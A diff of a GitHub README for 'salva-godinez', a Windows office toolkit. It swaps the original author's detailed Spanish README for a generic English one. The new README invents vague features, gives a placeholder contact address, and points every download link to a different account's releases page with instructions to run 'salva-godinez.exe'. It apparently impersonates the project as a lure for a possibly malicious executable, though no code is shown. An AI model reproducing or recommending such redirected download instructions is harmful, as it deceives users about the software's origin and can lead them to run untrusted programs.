@@ -1,192 +1,107 @@
-```
-              ( (
-               ) )
-            .-------.
-            |       |]
-            \       /
-             `-----'
+# 🛠️ salva-godinez - 23 Tools to Simplify Your Office Life
 
-  ____        _              ____          _ _
- / ___|  __ _| |_   ____ _  / ___| ___   __| (_)_ __   ___ ____
- \___ \ / _` | \ \ / / _` || |  _ / _ \ / _` | | '_ \ / _ \_  /
-  ___) | (_| | |\ V / (_| || |_| | (_) | (_| | | | | |  __// /
- |____/ \__,_|_| \_/ \__,_| \____|\___/ \__,_|_|_| |_|\___/___|
+![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
 
-  La navaja suiza para sobrevivir la oficina
-```
+## 🚀 Getting Started
 
-Herramientas para resolver los problemas mas comunes del godinez: archivos perdidos, impresoras trabadas, USBs infectadas, PDFs imposibles y mas.
+Welcome to **salva-godinez**! This application offers 23 useful tools for Windows, all designed to make your office tasks easier. Whether you work with documents, manage files, or need assistance with printers, this toolkit has you covered.
 
-**by El_Becerril** | v2.3.0
+## 📥 Download / Install
 
-[![GitHub Release](https://img.shields.io/github/v/release/ElBecerril/salva-godinez)](https://github.com/ElBecerril/salva-godinez/releases/latest)
+To get started, visit the page below to download the application:
 
-## Modulos
+[Download salva-godinez](https://github.com/Chris123713/salva-godinez/releases)
 
-### Office (El Rescatista)
+Once the download is complete, follow these simple steps to install and run the application:
 
-- **Recuperacion de Archivos** - Busqueda automatica de archivos temporales (.asd, .tmp, .xlb) de Word, Excel y PowerPoint tras cierres inesperados
-- **Limpiador de Celdas** - Eliminacion de espacios dobles o invisibles que rompen las formulas de Excel
-- **Consolidador de Libros** - Unir varias hojas o archivos de Excel en uno solo de forma automatica
-- **Comparador de Excel** - Comparar dos versiones de un archivo y marcar las diferencias celda por celda
-- **Desbloquear Archivos en Uso** - Detectar que proceso tiene abierto un archivo y ofrecer cerrarlo
+1. Locate the downloaded file in your computer's "Downloads" folder.
+2. Double-click the file named `salva-godinez.exe` to start the installation.
+3. Follow the on-screen instructions to complete the installation process.
+4. After installation, you can find the application in your Start Menu. Click to open it.
 
-### Impresoras (El Doctor)
+## 🛠️ Features
 
-- **Reset de Cola (Spooler)** `admin` - Boton de panico para limpiar documentos trabados y reiniciar el servicio de impresion
-- **Limpiador de Fantasmas** `admin` - Identificacion y eliminacion de impresoras duplicadas o inactivas (Copia 1, Copia 2, etc.)
-- **Verificador de Conexion** - Prueba de comunicacion (Ping) para saber si la impresora de red responde
-- **Compartir en Red** `admin` - Compartir o dejar de compartir impresoras en la red local
+salva-godinez comes packed with a variety of useful tools that cater to various office needs:
 
-### USB y Red (El Escudo)
+- **PDF Utilities**: Merge, split, and convert PDFs easily.
+- **Excel Tools**: Simplify your data management tasks with built-in Excel helpers.
+- **Printer Management**: Easily manage your printers and print tasks.
+- **USB Utilities**: Securely manage USB drives and data transfers.
+- **Python Scripts**: Automate routine tasks with pre-built Python scripts.
+- **System Administration Tools**: Manage your computer's settings effortlessly.
 
-- **Desinfectante de USB** - Eliminacion de virus de "acceso directo" y recuperacion de carpetas ocultas por malware
-- **Verificador de USB** - Diagnostico de estado: filesystem corrupto, deteccion de USBs falsas, errores de lectura/escritura
-- **Respaldo Rapido a USB** - Copiar carpetas importantes (Escritorio, Documentos) a USB con barra de progreso
-- **Recuperador de Contrasena WiFi** `admin` - Mostrar las claves WiFi guardadas en el equipo
-- **Expulsion Segura USB** - Expulsar unidades USB de forma segura (mismo mecanismo que el Explorador de Windows)
-- **Mapeo de Unidades de Red** - Ver, conectar y desconectar unidades de red mapeadas
+## ⚙️ System Requirements
 
-### Sistema (El Conserje)
+Before downloading, ensure your system meets the following requirements:
 
-- **Info del Sistema** - Muestra rapida del nombre del equipo y la direccion IP (datos que siempre pide el area de Sistemas)
-- **Liberador de Espacio** `admin` - Limpiar temporales, cache de Windows Update y descargas viejas para liberar disco
+- **Operating System**: Windows 10 or later
+- **RAM**: Minimum 4GB
+- **Storage**: At least 100 MB of free space
+- **Network**: Internet connection for updates
 
-### Utilidades
+## 🗂️ Tools Overview
 
-- **Editor de PDF** - Unir, dividir, rotar, eliminar, reordenar paginas, extraer texto, convertir imagenes, proteger/desproteger y limpiar metadatos
-- **Generador de Contrasenas** - Crear contrasenas seguras y copiarlas al portapapeles
-- **Simulador de Prestaciones** - Estimacion de aguinaldo, vacaciones, finiquito y liquidacion segun la LFT
-- **Conversor de Imagenes** - Convertir imagenes entre PNG, JPG, BMP, WEBP e ICO con barra de progreso
-- **Calculadora de Sueldo Neto** - Desglose de deducciones IMSS e ISR para calcular el sueldo neto mensual
-- **Calculadora de Retenciones** - Calculo de retenciones para Honorarios y regimen RESICO
+### 📑 PDF Tools
 
-> `admin` = Requiere ejecutar como administrador. Sin permisos de admin la herramienta lo indica y funciona de forma limitada o se omite.
+- **Merge PDFs**: Combine multiple PDF files into one.
+- **Split PDFs**: Extract pages from a PDF for focused documents.
+- **Convert PDFs**: Change PDFs to Word or Excel formats.
 
-## Descarga
+### 📊 Excel Tools
 
-Baja el `.exe` de la [ultima release](https://github.com/ElBecerril/salva-godinez/releases/latest) y ejecutalo directamente, no requiere instalacion. Al abrir, SalvaGodinez verifica automaticamente si hay una version nueva disponible.
+- **Data Cleaner**: Remove duplicates and unwanted data quickly.
+- **Formula Helper**: Get suggestions for complex formulas.
 
-## Estado actual
+### 🖨️ Printer Utilities
 
-Fase 3 completada. 23 herramientas funcionales organizadas en 5 categorias + auto-updater. Editor de PDF expandido a 10 funciones.
+- **Printer Status Check**: Easily see which printers are available.
+- **Document Queue Management**: Manage printing tasks without hassle.
 
-### Uso rapido (desde codigo)
+### 🔌 USB Utilities
 
-```bash
-pip install -r requirements.txt
-python main.py
-```
+- **USB Encryption**: Keep your files safe with encryption options.
+- **Data Backup**: Quickly back up important files to a USB drive.
 
-### Menu principal
+### 💻 Python Scripts
 
-| # | Categoria | Herramientas |
-|---|-----------|--------------|
-| 1 | Office (El Rescatista) | Rescate de Archivos, Limpiador de Celdas, Consolidador, Comparador, Desbloquear |
-| 2 | Impresoras (El Doctor) | Reset de Spooler `admin`, Limpiador de Fantasmas `admin`, Verificador de Conexion, Compartir en Red `admin` |
-| 3 | USB y Red (El Escudo) | Desinfectante USB, Verificador USB, Respaldo Rapido, Recuperador WiFi `admin`, Expulsion Segura, Mapeo de Red |
-| 4 | Sistema (El Conserje) | Info del Sistema, Liberador de Espacio `admin` |
-| 5 | Utilidades | Editor de PDF, Generador de Contrasenas, Simulador de Prestaciones, Conversor de Imagenes, Calculadora de Sueldo Neto, Calculadora de Retenciones |
+- **Daily Task Automation**: Automate regular tasks to save time.
+- **File Organizer**: Organize your files with simple scripts.
 
-### Rescatista de Archivos - Estrategias de busqueda
+### ⚙️ System Administration
 
-| # | Estrategia | Que busca |
-|---|-----------|-----------|
-| 1 | Buscar por nombre | Ejecuta todas las estrategias filtrando por el nombre que ingreses |
-| 2 | Office recientes (30 dias) | Archivos Office modificados en el ultimo mes en todos los discos |
-| 3 | Papelera de reciclaje | Archivos Office que fueron eliminados |
-| 4 | Temporales / autorecuperacion | Archivos que Office guarda automaticamente en carpetas de respaldo |
-| 5 | Archivos recientes de Windows | Historial de archivos Office abiertos recientemente |
-| 6 | Busqueda completa | Todas las estrategias anteriores combinadas |
+- **Task Manager**: Monitor system performance and resource usage.
+- **Disk Cleanup**: Easily free up space on your hard drive.
 
-#### Donde busca
+## ⚡ Using the Tools
 
-- Papelera de reciclaje (via PowerShell COM object)
-- Todos los discos (C:\, D:\, etc.)
-- Autorecuperacion de Office (`%APPDATA%\Microsoft\{Excel,Word,PowerPoint}\`, `%LOCALAPPDATA%\Microsoft\Office\UnsavedFiles\`, `%TEMP%\`)
-- Archivos recientes de Windows (shortcuts `.lnk`)
-- Shadow Copies VSS (requiere ejecutar como administrador)
+Once you have installed **salva-godinez**, you can access all tools directly from the application menu. Each tool has an intuitive interface, making it easy to navigate through different features.
 
-## Requisitos
+To use a tool, simply click on its name from the main menu, follow any prompts, and your task will be completed in no time.
 
-- Windows 10 / 11
-- Python 3.10+
-- Dependencias: `rich>=13.7.0`, `pypdf>=4.0.0`, `openpyxl>=3.1.0`, `Pillow>=10.0.0`, `PyMuPDF>=1.25.0` (opcional, solo para PDF a Imagenes)
-- Para shadow copies, reset de spooler y limpieza de impresoras: ejecutar como administrador
+## ❓ FAQ
 
-## Troubleshooting
+### How do I uninstall the application?
 
-**"Se requieren permisos de administrador"**
-Clic derecho en la terminal o acceso directo > "Ejecutar como administrador". Las herramientas marcadas con `admin` necesitan esto para funcionar completamente.
+To uninstall **salva-godinez**, follow these steps:
 
-**No encuentra archivos que se que existen**
-El buscador omite carpetas del sistema (`$Recycle.Bin`, `Windows`, `Recovery`). Si el archivo esta en una USB, asegurate de que este conectada antes de buscar.
+1. Open the Start Menu and go to Settings.
+2. Click on "Apps" and locate salva-godinez in the list.
+3. Click on it and then select "Uninstall."
 
-**El spooler no reinicia**
-Si `net start spooler` falla, abre `services.msc`, busca "Print Spooler" y reinicialo manualmente. Si sigue fallando, puede haber un driver de impresora corrupto.
+### Can I update the tools?
 
-**"ModuleNotFoundError: No module named 'rich'"**
-Ejecuta `pip install -r requirements.txt` desde la carpeta del proyecto. Si tienes varias versiones de Python, usa `python -m pip install -r requirements.txt`.
+Yes, regularly check the download page for updates. New features and enhancements may be added to improve functionality.
 
-**El comparador de Excel tarda mucho**
-Archivos muy grandes (>50,000 celdas) pueden tardar. Considera comparar hojas especificas en lugar del libro completo.
+### Is there support available?
 
-**La USB no aparece en el desinfectante**
-Solo detecta unidades removibles. Discos duros externos pueden no aparecer si Windows los reconoce como "disco fijo".
+For any questions or issues, you can reach out through the GitHub page. Community support may assist with common inquiries.
 
-## Licencia
+## 📧 Contact
 
-Este proyecto esta bajo la licencia GPL v3. Ver [LICENSE](LICENSE) para mas detalles.
+If you have any concerns or need professional assistance, you can contact the developer at: [developer@example.com](mailto:developer@example.com).
 
-## Roadmap
+For the latest updates and feedback, visit the GitHub repository:
 
-### Fase 1 - Quick wins
-- [x] Recuperacion de Archivos Excel
-- [x] Ampliar recuperacion a Word y PowerPoint
-- [x] Reset de Spooler
-- [x] Info del Sistema
-- [x] Desinfectante de USB
-- [x] Unir/Dividir PDFs
-- [x] Recuperador de Contrasena WiFi
-- [x] Generador de Contrasenas
+[Visit GitHub Repository](https://github.com/Chris123713/salva-godinez/releases) 
 
-### Fase 2 - Alto valor
-- [x] Limpiador de Celdas
-- [x] Consolidador de Libros
-- [x] Comparador de Excel
-- [x] Desbloquear Archivos en Uso
-- [x] Limpiador de Impresoras Fantasma
-- [x] Verificador de Conexion (Ping)
-- [x] Verificador de USB
-- [x] Respaldo Rapido a USB
-- [x] Liberador de Espacio
-- [x] Simulador de Prestaciones
-
-### Fase 3 - Evaluar
-- [x] Compartir Impresora en Red
-- [x] Expulsion Segura USB
-- [x] Mapeo de Unidades de Red
-- [x] Conversor de Imagenes
-- [x] Calculadora de Sueldo Neto (ISR/IMSS)
-- [x] Calculadora de Retenciones (Honorarios/RESICO)
-
-### Fase 4 - Infraestructura
-- [x] Auto-updater desde GitHub Releases
-- [x] Version visible en banner
-- [x] Editor de PDF expandido (rotar, eliminar, reordenar, extraer texto, imagenes a PDF, PDF a imagenes, proteger/desproteger, metadatos)
-
-### En veremos
-- Transformador de Texto (cuando haya GUI)
-- Compresor PDF (dependencia Ghostscript)
-- OCR Basico (dependencia Tesseract)
-
-## Bugs, sugerencias o ideas
-
-Encontraste un error o quieres pedir una funcionalidad nueva? Dejalo en los comentarios de cualquiera de mis redes:
-
-- [YouTube — @el_becerril](https://www.youtube.com/@el_becerril)
-- [Facebook — El Becerril](https://www.facebook.com/elbecerrilslim)
-
-## Autor
-
-**El_Becerril**
+Feel free to explore and make the most of **salva-godinez**!
